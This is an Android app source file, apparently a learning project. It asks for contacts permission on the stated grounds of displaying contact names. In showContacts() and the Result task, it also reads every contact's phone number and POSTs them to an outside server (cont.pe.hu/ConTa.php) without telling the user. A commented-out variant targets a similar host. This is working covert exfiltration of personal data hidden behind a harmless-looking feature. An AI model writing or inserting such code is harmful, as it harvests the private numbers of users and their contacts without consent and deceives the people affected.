package com.ssalphax.learn;

import android.Manifest;
import android.app.ProgressDialog;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.http.AndroidHttpClient;
import android.os.AsyncTask;
import android.os.Build;
import android.provider.ContactsContract;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.Toast;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.BasicResponseHandler;
import org.apache.http.impl.client.DefaultHttpClient;
//import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
ListView lstView;
    int i=0;
ArrayList<String> aa=new ArrayList<>();
  final  String url="http://cont.pe.hu/ConTa.php";
    ArrayList<String> personName=new ArrayList<>();
    private static final int PERMISSIONS_REQUEST_READ_CONTACTS = 100;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        lstView=(ListView)findViewById(R.id.lstShow);



showContacts();






//        Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
//        while (phones.moveToNext())
//        {
//            String name=phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
//            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
//            Toast.makeText(getApplicationContext(),name, Toast.LENGTH_LONG).show();
//            aa.add(phoneNumber);
//
//        }
//        phones.close();
//
//        ArrayAdapter<String> arrayAdapter=new ArrayAdapter<String>(this,android.R.layout.simple_list_item_1,aa);
//        lstView.setAdapter(arrayAdapter);
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions,
                                           int[] grantResults) {
        if (requestCode == PERMISSIONS_REQUEST_READ_CONTACTS) {
            if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Permission is granted
                showContacts();
            } else {
                Toast.makeText(this, "Until you grant the permission, we canot display the names", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void showContacts() {
        // Check the SDK version and whether the permission is already granted or not.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, PERMISSIONS_REQUEST_READ_CONTACTS);
            //After this point you wait for callback in onRequestPermissionsResult(int, String[], int[]) overriden method
        } else {
            // Android version is lesser than 6.0 or the permission is already granted.
            List<String> contacts = getContactNames();
            ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, contacts);
            lstView.setAdapter(adapter);
            sendContact();
        }
    }
    private List<String> getContactNames() {
     //   List<String> contacts = new ArrayList<>();
        // Get the ContentResolver
//        ContentResolver cr = getContentResolver();
//        // Get the Cursor of all the contacts
//        Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
//
//        // Move the cursor to first. Also check whether the cursor is empty or not.
//        if (cursor.moveToFirst()) {
//            // Iterate through the cursor
//            do {
//                // Get the contacts name
//                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
//                contacts.add(name);
//            } while (cursor.moveToNext());
//        }
//        // Close the curosor
//       // cursor.close();

        ContentResolver resolver=getContentResolver();
        Cursor cursor= resolver.query(ContactsContract.Contacts.CONTENT_URI,null,null,null,null);

        while(cursor.moveToNext()){


            String id= cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
            String name=cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
            personName.add(name);
//            Log.d("name:::::",name);
            Cursor phoneCursor=resolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID+"=?",new String[]{id},null);

            while (phoneCursor.moveToNext())
            {
                String phoneNumber=phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
           //     Log.d("MObile NO.=",phoneNumber);
                aa.add(phoneNumber);
            }

        }

        return aa;
    }




    class Result extends AsyncTask<String,String,String>{

String re=null;
Context mContext;
//        Result(Context mContext){
//            this.mContext=mContext;
//
//        }
//        ProgressDialog dialog=new ProgressDialog(mContext);
//        @Override
//        protected void onPreExecute() {
//            super.onPreExecute();
//            this.dialog.setMessage("Please wait...");
//            this.dialog.show();
//
//
//        }

        @Override
        protected String doInBackground(String... params) {
            StringBuilder sb = new StringBuilder();
ArrayList<NameValuePair> namePairValues=new ArrayList<>();
            try {
            HttpClient httpClient=new DefaultHttpClient();
            HttpPost httpPost=new HttpPost(url);

            for(int i=0;i<aa.size();i++){
               // namePairValues.add(new BasicNameValuePair("name",personName.get(i)));
                namePairValues.add(new BasicNameValuePair("contact",aa.get(i)));

            }
//                for(int i=0;i<personName.size();i++){
//                     namePairValues.add(new BasicNameValuePair("name",personName.get(i)));
//                   // namePairValues.add(new BasicNameValuePair("contact",aa.get(i)));
//
//                }


                httpPost.setEntity(new UrlEncodedFormEntity(namePairValues));
                HttpResponse httpResponse=httpClient.execute(httpPost);
                HttpEntity httpEntity=httpResponse.getEntity();
               InputStream is=httpEntity.getContent();
                BufferedReader reader = new BufferedReader(new InputStreamReader(
                        is, "iso-8859-1"), 8);
               // StringBuilder sb = new StringBuilder();
                String line = null;
                while ((line = reader.readLine()) != null) {
                    sb.append(line + "\n");
                }



              //  ResponseHandler<String> responseHandler=new BasicResponseHandler();

//                final String res=httpClient.execute(httpPost,responseHandler);
//
//
//                re=res;

//                String data = URLEncoder.encode("contact", "UTF-8") + "=" + URLEncoder.encode(params[0], "UTF-8");
//               // data += "&" + URLEncoder.encode("contact", "UTF-8") + "=" + URLEncoder.encode(params[1], "UTF-8");
//
//
//                URL url = new URL("http://ssalphax.pe.hu/ConTa.php");
//                URLConnection conn = url.openConnection();
//
//                conn.setDoOutput(true);
//                OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
//
//                wr.write(data);
//                wr.flush();
//
//                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
//
//
//                String line = null;
//
//                // Read Server Response
//                while ((line = reader.readLine()) != null) {
//                    sb.append(line);
//                    break;
//                }


            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            } catch (ClientProtocolException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }

            return sb.toString();

        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);

            Log.d("submittttt",s);
            sendContact();


        }
    }



    void sendContact(){

       // int n=aa.size();

        while (i<3){

            new Result().execute(aa.get(i));
            ++i;

        }
//else
//            Toast.makeText(getApplicationContext(),"inserted",Toast.LENGTH_SHORT).show();




    }




}
